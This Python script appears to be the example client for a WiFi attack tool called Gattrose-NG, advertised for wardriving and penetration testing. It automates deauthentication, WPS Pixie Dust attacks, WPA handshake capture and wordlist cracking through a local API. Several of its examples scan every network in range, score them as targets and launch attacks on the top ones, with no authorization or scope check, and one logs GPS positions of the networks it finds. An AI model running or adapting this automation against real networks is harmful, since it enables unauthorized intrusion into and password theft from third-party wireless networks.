#!/usr/bin/env python3
"""
Gattrose-NG API Automation Examples

Demonstrates how to use the API v3 for complete headless automation.
Perfect for wardriving, penetration testing, and automated recon.
"""

import requests
import time
import json
import sys
from datetime import datetime
from typing import Dict, List, Optional


class GattroseAPI:
    """Simple API client for Gattrose-NG"""

    def __init__(self, base_url: str = "http://localhost:5555", api_key: Optional[str] = None):
        self.base_url = base_url
        self.api_key = api_key
        self.session = requests.Session()
        self.session.headers.update({'Content-Type': 'application/json'})
        if api_key:
            self.session.headers.update({'X-API-Key': api_key})

    def _request(self, method: str, endpoint: str, **kwargs):
        """Make API request"""
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.session.request(method, url, **kwargs)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"❌ API Error: {e}")
            return None

    # System endpoints
    def get_status(self):
        """Get system status"""
        return self._request('GET', '/api/v3/status')

    def start_services(self):
        """Start all services"""
        return self._request('POST', '/api/v3/services/start')

    def stop_services(self):
        """Stop all services"""
        return self._request('POST', '/api/v3/services/stop')

    # Scanner endpoints
    def start_scanner(self, interface: str = "wlan0mon", channel: Optional[int] = None):
        """Start WiFi scanner"""
        data = {'interface': interface}
        if channel:
            data['channel'] = channel
        return self._request('POST', '/api/v3/services/scanner/start', json=data)

    def stop_scanner(self):
        """Stop WiFi scanner"""
        return self._request('POST', '/api/v3/services/scanner/stop')

    def get_scanner_status(self):
        """Get scanner status"""
        return self._request('GET', '/api/v3/services/scanner/status')

    # Network endpoints
    def get_networks(self, limit: int = 100, offset: int = 0, **filters):
        """Get networks with optional filters"""
        if filters:
            return self._request('POST', '/api/v3/networks/filter', json=filters)
        return self._request('GET', '/api/v3/networks', params={'limit': limit, 'offset': offset})

    def get_network(self, bssid: str):
        """Get specific network details"""
        return self._request('GET', f'/api/v3/networks/{bssid}')

    def blacklist_network(self, bssid: str, reason: str = "Automated blacklist"):
        """Add network to blacklist"""
        return self._request('POST', '/api/v3/networks/blacklist/add', json={'bssid': bssid, 'reason': reason})

    # Attack endpoints
    def start_deauth(self, bssid: str, client: Optional[str] = None, count: int = 10):
        """Start deauth attack"""
        data = {'bssid': bssid, 'count': count}
        if client:
            data['client'] = client
        return self._request('POST', '/api/v3/attacks/deauth/start', json=data)

    def capture_handshake(self, bssid: str, timeout: int = 300):
        """Capture handshake"""
        return self._request('POST', '/api/v3/attacks/handshake/capture', json={'bssid': bssid, 'timeout': timeout})

    def start_wps_pixie(self, bssid: str):
        """Start WPS Pixie Dust attack"""
        return self._request('POST', '/api/v3/attacks/wps/pixie', json={'bssid': bssid})

    def get_handshakes(self):
        """Get all captured handshakes"""
        return self._request('GET', '/api/v3/handshakes')

    def crack_handshake(self, handshake_id: int, wordlist: str = "/usr/share/wordlists/rockyou.txt"):
        """Start cracking handshake"""
        return self._request('POST', f'/api/v3/handshakes/{handshake_id}/crack', json={'wordlist': wordlist})

    # GPS endpoints
    def get_gps_location(self):
        """Get current GPS location"""
        return self._request('GET', '/api/v3/services/gps/location')

    # Analytics endpoints
    def get_analytics(self):
        """Get analytics summary"""
        return self._request('GET', '/api/v3/analytics/summary')

    # File operations
    def export_csv(self, output_file: str = "gattrose_export.csv"):
        """Export networks to CSV"""
        response = self.session.post(f"{self.base_url}/api/v3/files/export/csv")
        if response.status_code == 200:
            with open(output_file, 'wb') as f:
                f.write(response.content)
            return True
        return False


# ==================== Example Automation Scripts ====================

def example_1_basic_scan():
    """Example 1: Basic WiFi scanning"""
    print("\n" + "="*70)
    print("Example 1: Basic WiFi Scanning")
    print("="*70 + "\n")

    api = GattroseAPI()

    # Start services
    print("📡 Starting services...")
    result = api.start_services()
    if result and result.get('success'):
        print("✅ Services started")
    else:
        print("❌ Failed to start services")
        return

    time.sleep(2)

    # Start scanner
    print("\n📡 Starting WiFi scanner...")
    result = api.start_scanner(interface="wlan0mon")
    if result and result.get('success'):
        print("✅ Scanner started")
    else:
        print("❌ Failed to start scanner")
        return

    # Scan for 30 seconds
    print("\n⏳ Scanning for 30 seconds...")
    for i in range(30):
        time.sleep(1)
        if i % 5 == 0:
            networks = api.get_networks(limit=5)
            if networks and networks.get('success'):
                count = networks.get('data', {}).get('total', 0)
                print(f"   Found {count} networks so far...")

    # Get results
    print("\n📊 Scan Results:")
    networks = api.get_networks(limit=100)
    if networks and networks.get('success'):
        total = networks.get('data', {}).get('total', 0)
        network_list = networks.get('data', {}).get('networks', [])
        print(f"   Total networks: {total}")
        print(f"\n   Top 5 networks by signal:")
        for i, net in enumerate(network_list[:5], 1):
            print(f"   {i}. {net['ssid'] or 'Hidden':30s} {net['bssid']:17s} {net['encryption']:15s} {net['signal']:4d} dBm")

    # Stop scanner
    print("\n🛑 Stopping scanner...")
    api.stop_scanner()
    print("✅ Complete!")


def example_2_targeted_wps_attack():
    """Example 2: Targeted WPS attack on vulnerable networks"""
    print("\n" + "="*70)
    print("Example 2: Targeted WPS Attack")
    print("="*70 + "\n")

    api = GattroseAPI()

    # Start services and scanner
    print("📡 Starting services and scanner...")
    api.start_services()
    time.sleep(2)
    api.start_scanner(interface="wlan0mon")

    # Wait for networks
    print("⏳ Scanning for WPS-enabled networks (30 seconds)...")
    time.sleep(30)

    # Find WPS-enabled networks
    print("\n🔍 Finding WPS-enabled networks...")
    wps_networks = api.get_networks(wps_enabled=True, min_signal=-70)

    if not wps_networks or not wps_networks.get('success'):
        print("❌ No WPS networks found")
        api.stop_scanner()
        return

    targets = wps_networks.get('data', {}).get('networks', [])
    print(f"✅ Found {len(targets)} WPS-enabled networks")

    # Attack each WPS network
    for i, target in enumerate(targets[:5], 1):  # Attack top 5
        print(f"\n🎯 Attacking target {i}/{min(5, len(targets))}")
        print(f"   SSID: {target['ssid'] or 'Hidden'}")
        print(f"   BSSID: {target['bssid']}")
        print(f"   Signal: {target['signal']} dBm")

        # Start WPS Pixie Dust attack
        result = api.start_wps_pixie(target['bssid'])
        if result and result.get('success'):
            print(f"   ✅ WPS attack started")
            # In real scenario, wait for attack to complete
            # and check status periodically
        else:
            print(f"   ❌ WPS attack failed to start")

        time.sleep(2)

    print("\n✅ Attack sequence complete!")
    api.stop_scanner()


def example_3_handshake_collection():
    """Example 3: Automated handshake collection"""
    print("\n" + "="*70)
    print("Example 3: Automated Handshake Collection")
    print("="*70 + "\n")

    api = GattroseAPI()

    # Start services
    print("📡 Starting services...")
    api.start_services()
    time.sleep(2)
    api.start_scanner(interface="wlan0mon")

    # Scan for high-value targets
    print("⏳ Scanning for high-value targets (60 seconds)...")
    time.sleep(60)

    # Find WPA2 networks with good signal
    print("\n🔍 Finding WPA2 networks...")
    networks = api.get_networks(encryption="WPA2", min_signal=-70)

    if not networks or not networks.get('success'):
        print("❌ No suitable networks found")
        api.stop_scanner()
        return

    targets = networks.get('data', {}).get('networks', [])[:10]  # Top 10
    print(f"✅ Found {len(targets)} target networks")

    # Capture handshakes
    for i, target in enumerate(targets, 1):
        print(f"\n📡 Capturing handshake {i}/{len(targets)}")
        print(f"   SSID: {target['ssid'] or 'Hidden'}")
        print(f"   BSSID: {target['bssid']}")

        result = api.capture_handshake(target['bssid'], timeout=120)
        if result and result.get('success'):
            print(f"   ✅ Handshake capture started")
            time.sleep(120)  # Wait for capture
        else:
            print(f"   ❌ Failed to start capture")

    # Get summary
    print("\n📊 Handshake Summary:")
    handshakes = api.get_handshakes()
    if handshakes and handshakes.get('success'):
        total = handshakes.get('data', {}).get('count', 0)
        print(f"   Total handshakes captured: {total}")

    api.stop_scanner()
    print("\n✅ Complete!")


def example_4_continuous_monitoring():
    """Example 4: Continuous monitoring with analytics"""
    print("\n" + "="*70)
    print("Example 4: Continuous Monitoring & Analytics")
    print("="*70 + "\n")

    api = GattroseAPI()

    # Start services
    print("📡 Starting continuous monitoring...")
    api.start_services()
    time.sleep(2)
    api.start_scanner(interface="wlan0mon")

    try:
        print("\n⏳ Monitoring... (Press Ctrl+C to stop)\n")

        while True:
            # Get analytics every 30 seconds
            analytics = api.get_analytics()

            if analytics and analytics.get('success'):
                data = analytics.get('data', {})
                networks = data.get('networks', {})
                clients = data.get('clients', {})
                handshakes = data.get('handshakes', {})

                print(f"\n📊 Status [{datetime.now().strftime('%H:%M:%S')}]")
                print(f"   Networks: {networks.get('total', 0)} total | {networks.get('wpa', 0)} WPA | {networks.get('open', 0)} Open | {networks.get('wps_enabled', 0)} WPS")
                print(f"   Clients: {clients.get('total', 0)} total")
                print(f"   Handshakes: {handshakes.get('total', 0)} total | {handshakes.get('cracked', 0)} cracked")

            # Get GPS location
            location = api.get_gps_location()
            if location and location.get('success'):
                gps = location.get('data', {})
                print(f"   GPS: {gps.get('latitude', 0):.6f}, {gps.get('longitude', 0):.6f} ({gps.get('source', 'unknown')})")

            time.sleep(30)

    except KeyboardInterrupt:
        print("\n\n🛑 Stopping monitoring...")
        api.stop_scanner()
        print("✅ Complete!")


def example_5_export_results():
    """Example 5: Scan and export results"""
    print("\n" + "="*70)
    print("Example 5: Scan and Export Results")
    print("="*70 + "\n")

    api = GattroseAPI()

    # Quick scan
    print("📡 Starting quick scan...")
    api.start_services()
    time.sleep(2)
    api.start_scanner(interface="wlan0mon")

    print("⏳ Scanning for 60 seconds...")
    time.sleep(60)

    # Get results
    print("\n📊 Collecting results...")
    networks = api.get_networks(limit=1000)
    if networks and networks.get('success'):
        total = networks.get('data', {}).get('total', 0)
        print(f"   Found {total} networks")

    # Export to CSV
    print("\n💾 Exporting to CSV...")
    output_file = f"gattrose_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    if api.export_csv(output_file):
        print(f"   ✅ Exported to: {output_file}")
    else:
        print(f"   ❌ Export failed")

    # Stop
    api.stop_scanner()
    print("\n✅ Complete!")


def example_6_smart_attack_queue():
    """Example 6: Smart attack prioritization"""
    print("\n" + "="*70)
    print("Example 6: Smart Attack Queue")
    print("="*70 + "\n")

    api = GattroseAPI()

    # Start services
    print("📡 Starting services and scanner...")
    api.start_services()
    time.sleep(2)
    api.start_scanner(interface="wlan0mon")

    # Scan
    print("⏳ Scanning for targets (60 seconds)...")
    time.sleep(60)

    # Get all networks and prioritize
    print("\n🎯 Analyzing targets...")
    networks = api.get_networks(limit=1000)
    if not networks or not networks.get('success'):
        print("❌ No networks found")
        return

    all_networks = networks.get('data', {}).get('networks', [])

    # Prioritize targets
    priority_queue = []
    for net in all_networks:
        score = 0

        # WPS enabled = high priority
        if net.get('wps_enabled'):
            score += 50

        # Good signal = higher priority
        signal = net.get('signal', -100)
        if signal > -60:
            score += 30
        elif signal > -70:
            score += 20
        elif signal > -80:
            score += 10

        # WPA2 = medium priority
        if 'WPA2' in net.get('encryption', ''):
            score += 20

        priority_queue.append((score, net))

    # Sort by score
    priority_queue.sort(reverse=True, key=lambda x: x[0])

    # Display top targets
    print(f"\n📊 Top 10 High-Priority Targets:")
    for i, (score, net) in enumerate(priority_queue[:10], 1):
        print(f"   {i}. Score: {score:3d} | {net['ssid'] or 'Hidden':30s} | {net['bssid']} | {net['encryption']}")

    # Attack top 5
    print(f"\n🚀 Attacking top 5 targets...")
    for i, (score, net) in enumerate(priority_queue[:5], 1):
        print(f"\n   Target {i}/5: {net['ssid'] or 'Hidden'} ({net['bssid']})")

        # Choose attack strategy
        if net.get('wps_enabled'):
            print(f"   Strategy: WPS Pixie Dust")
            result = api.start_wps_pixie(net['bssid'])
        else:
            print(f"   Strategy: Handshake Capture")
            result = api.capture_handshake(net['bssid'], timeout=120)

        if result and result.get('success'):
            print(f"   ✅ Attack started")
        else:
            print(f"   ❌ Attack failed")

        time.sleep(5)

    print("\n✅ Attack queue processed!")
    api.stop_scanner()


# ==================== Main Menu ====================

def main():
    """Main menu for examples"""
    print("="*70)
    print("Gattrose-NG API Automation Examples")
    print("="*70)
    print()
    print("Available examples:")
    print()
    print("1. Basic WiFi Scanning")
    print("2. Targeted WPS Attack")
    print("3. Automated Handshake Collection")
    print("4. Continuous Monitoring with Analytics")
    print("5. Scan and Export Results")
    print("6. Smart Attack Queue")
    print()
    print("0. Exit")
    print()

    try:
        choice = input("Select example (0-6): ").strip()

        if choice == '1':
            example_1_basic_scan()
        elif choice == '2':
            example_2_targeted_wps_attack()
        elif choice == '3':
            example_3_handshake_collection()
        elif choice == '4':
            example_4_continuous_monitoring()
        elif choice == '5':
            example_5_export_results()
        elif choice == '6':
            example_6_smart_attack_queue()
        elif choice == '0':
            print("Goodbye!")
            sys.exit(0)
        else:
            print("❌ Invalid choice")

    except KeyboardInterrupt:
        print("\n\nInterrupted by user")
        sys.exit(0)


if __name__ == '__main__':
    # Check if API is reachable
    try:
        response = requests.get("http://localhost:5555/api/v3", timeout=2)
        if response.status_code != 200:
            print("❌ Gattrose API is not reachable")
            print("\nPlease start the API server first:")
            print("  python3 src/services/local_api_v3.py")
            sys.exit(1)
    except Exception as e:
        print(f"❌ Cannot connect to API: {e}")
        print("\nPlease start the API server first:")
        print("  python3 src/services/local_api_v3.py")
        sys.exit(1)

    main()
